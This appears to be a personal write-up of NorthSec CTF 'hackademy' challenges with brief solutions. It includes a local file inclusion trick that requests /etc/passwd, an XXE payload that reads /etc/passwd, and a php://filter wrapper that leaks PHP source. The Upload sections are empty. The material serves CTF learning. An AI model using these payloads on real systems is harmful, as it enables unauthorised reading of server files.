## hackademy-writeup

Every year, I participate in the NorthSec CTF, and every year, when I come face to face with the hackademy track, my mind just goes blank.
This writeup is intended for personal use in the same track next year, but hey, I made the repo public if it can help anyone!

### Automatization 101
Check source code

### Automatization 102
Look at the robots.txt file

### Inclusion 101
Change the ```?page=welcome.php``` to ```/etc/passwd```

### Inclusion 102
This is an XXE, check the source code, then catch the request in burp, modify the body in the repeater for something like this:
```<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY ext SYSTEM "file:///etc/passwd" >]><function><getConversation>&ext;</getConversation></function>```

(thanks lolkatz)

### Inclusion 103
PHP convert to Base64... add ```php://filter/convert.base64-encode/resource=index.php``` after the ```?page=```
Decode the string

### Upload 101


### Upload 102


### Upload 103


